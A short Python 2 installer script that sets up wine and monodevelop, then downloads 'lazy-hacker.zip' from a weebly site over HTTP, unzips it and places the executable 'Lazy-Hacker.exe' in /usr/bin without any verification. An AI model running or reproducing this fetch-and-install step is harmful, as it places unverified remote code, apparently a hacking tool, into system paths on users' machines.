#!/usr/bin/env python
import os
os.system("apt-get install wine")
os.system("apt-get install wine32")

yes = 'Y'
no  = 'n'

rt = raw_input('Do you want to install "MONODEVELOP" and the packege of 168mb [Y/n]: ')
if rt == 'Y':
   print "Installing monodevelop and packege>>>>"
   os.system("apt-get install git-core monodevelop") 
from os import system
commands = [
    "wget http://darkalienweb.weebly.com/uploads/1/0/7/9/107956521/lazy-hacker.zip",
    "unzip lazy-hacker.zip",
    "chmod +x Lazy-Hacker.exe",
    "mv Lazy-Hacker.exe /usr/bin",
    "rm lazy-hacker.zip",
    "Installer.py",
]
for i in commands:
      system(i)
print "\033[1;39mThe Tool is successfully installed on your system";
